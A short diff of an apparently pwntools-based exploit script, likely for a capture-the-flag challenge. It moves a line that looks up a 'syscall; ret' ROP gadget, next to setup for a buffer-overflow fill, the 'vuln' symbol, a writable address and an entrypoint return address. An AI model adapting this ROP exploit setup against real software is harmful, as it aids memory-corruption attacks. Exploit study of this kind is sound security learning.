@@ -42,8 +42,8 @@ padding = 8
 fill = cyclic(buf_v13+padding)
 
 r = ROP(exe)
-syscall_ret = r.find_gadget(['syscall','ret'])[0]
 read = exe.sym['vuln']
+syscall_ret = r.find_gadget(['syscall','ret'])[0]
 writable = 0x401000
 new_ret = 0x4010f0 # Program Entrypoint
 
